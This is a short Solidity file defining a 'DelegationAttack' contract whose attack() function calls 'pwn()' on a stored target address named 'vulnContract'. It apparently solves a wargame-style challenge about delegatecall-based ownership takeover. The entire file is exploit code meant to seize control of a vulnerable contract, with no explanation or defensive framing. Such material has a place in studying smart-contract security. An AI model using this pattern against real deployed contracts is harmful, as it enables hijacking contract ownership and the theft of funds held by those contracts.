// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract DelegationAttack {
  address public vulnContract;
  
  constructor(address _vulnContract) public {
    vulnContract = _vulnContract;
  }

  function attack() public {
      vulnContract.call(abi.encodeWithSignature("pwn()"));
  }

}
